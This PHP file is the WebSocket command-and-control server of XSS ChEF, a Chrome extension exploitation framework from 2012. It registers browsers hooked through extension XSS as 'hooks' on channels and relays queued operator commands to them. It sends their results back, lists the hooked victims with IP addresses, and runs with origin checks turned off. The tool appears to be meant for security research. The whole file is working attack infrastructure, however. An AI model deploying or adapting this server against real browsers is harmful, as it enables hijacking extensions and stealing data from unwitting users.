<?php
/*
    XSS ChEF - Chrome Extension Exploitation framework
    Copyright (C) 2012  Krzysztof Kotowicz - http://blog.kotowicz.net

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.
*/
ini_set('display_errors', true);

require_once __DIR__ . '/php-websocket/server/lib/SplClassLoader.php';
$class_loader = new SplClassLoader('WebSocket', __DIR__ . '/php-websocket/server/lib');
$class_loader->register();

class xssChefServerApplication extends \WebSocket\Application\Application
{
    private $_clients = array();

	protected $resultStorage = array();
	protected $commandStorage = array();
	
	public function onConnect($client)
    {
		$id = $client->getClientId();
        $this->_clients[$id] = $client;		
    }
	protected function _decodeData($data)
	{
		$decodedData = json_decode($data, true);
		if($decodedData === null)
		{
			return false;
		}

		if(isset($decodedData['cmd']) === false)
		{
			return false;
		}
		return $decodedData;
	}
	
	protected function _encodeData($action, $data)
	{
		if(empty($action))
		{
			return false;
		}
		
		$payload = array(
			'cmd' => $action,
			'payload' => $data
		);
		return json_encode($data);
	}
    

    public function onDisconnect($client)
    {
        $id = $client->getClientId();		
		unset($this->_clients[$id]);     
    }

    public function onData($data, $client)
    {		
        $decodedData = $this->_decodeData($data);		
		if($decodedData === false)
		{
            throw new Exception('Invalid data format');
		}

		$client->lastActive = date('Y-m-d H:i:s');
		
		$cmdName = $decodedData['cmd'];

        switch ($cmdName) {
            case 'hello-c2c':
                $client->isHook = false;
                $client->isC2C = true;
            break;
            case 'set-channel':
                if (!$client->isC2C) {
                    throw new Exception("Only c2c can set-channel");
                }
                $client->channel = $decodedData['ch'];
                $this->pushToc2c($client->channel);
            break;
            case 'hello-hook':
                $client->isHook = true;
                $client->isC2C = false;
                $client->channel = $decodedData['ch'];
                echo ('New hook ' . $client->channel . ' from ' . $client->getClientIp());
                $this->pushToHook($client->channel); // send pending messages
                /*
                connections.forEach(function(c) {
                    if (c.isC2C) {
                        c.sendUTF(JSON.stringify([[{type:'server_msg', result: 'New hook: '+ payload.ch + ' - ' + $client->getClientIp()}]]));
                    }
                });
                */
            break;
            case 'command': // from c&c to hook
                if (!$client->isC2C) {
                   throw new Exception("Not authorized to send commands");
                }
                if (!$client->channel) {
                    throw new Exception("No channel set in connection (command)");
                }
                if (!$this->commandStorage[$client->channel]) {
                    $this->commandStorage[$client->channel] = array();
                }
                $this->logHookCommand($client->channel, $decodedData['p']);
                $this->commandStorage[$client->channel][] = $decodedData['p'];
                $this->pushToHook($client->channel);
            break;
            case 'post': // from hook back to c&c 
                if (!$client->channel) {
                    throw new Exception("No channel set in connection (post)");
                }
                
                if (empty($this->resultStorage[$client->channel])) {
                    $this->resultStorage[$client->channel] = array();
                }
                $this->logHookResponse($client->channel, $decodedData['p']);
                $this->resultStorage[$client->channel][] = $decodedData['p'];
                $this->pushToc2c($client->channel);
            break;
            case 'delete':
                if ($client->isC2C) {
                    $this->resultStorage = array();
                    $this->commandStorage = array();
                }
            break;
            case 'list':
                if ($client->isC2C) {
                    $hooks = array();
                    foreach ($this->_clients as $c) {
                        if ($c->isHook) {
                            $hooks[] = array(
                                "ch"=> $c->channel,
                                "ip"=> $c->getClientIp(),
                                "lastActive" => $c->lastActive,
                            );
                        }
                    };
                    $client->send(json_encode(array(array(array("type" => 'list', "result"=> $hooks)))));
                }
            break;
            default:
                throw new Exception('Unknown command ' . $decodedData['cmd']);
        }		
    }   
    
    protected function logHookResponse($channel, $payloads) {
    /*
        var payload;
        // payloads is array
        for (var i = 0; i < payloads.length; i++) {
            payload = payloads[i];

            if (!payload.type)
                return;
            
            switch (payload.type) {
                default:
                    logPayload(channel, "R", JSON.stringify(payload));
                break;
            }
        }
        */
    }
        
    protected function logPayload($channel, $type, $data) {
        /* todo stderr */
        echo (date('Y-m-d H:i:s') . "\t" . $channel . "\t" . $type . "\t" . $data);
    }
   
    protected function logHookCommand($channel, $payload) {
        $this->logPayload($channel, "C", json_encode($payload));
    }

    protected function push($channel, $flagName, &$container) {
        foreach ($this->_clients as $c) {
            if ($c->$flagName && $c->channel == $channel) {
               if (!empty($container[$channel])) {
                    $c->send(json_encode($container[$channel]));
                    unset($container[$channel]);
                    return;
               }
               
            }
        }
    }
    
    protected function pushToc2c($channel) {
        return $this->push($channel, 'isC2C', $this->resultStorage);
    }
    
    protected function pushToHook($channel) {
        return $this->push($channel, 'isHook', $this->commandStorage);
    }
}

$server = new \WebSocket\Server('127.0.0.1', 8080, false);

$server->setCheckOrigin(false);
$server->registerApplication('chef', xssChefServerApplication::getInstance());
$server->run();
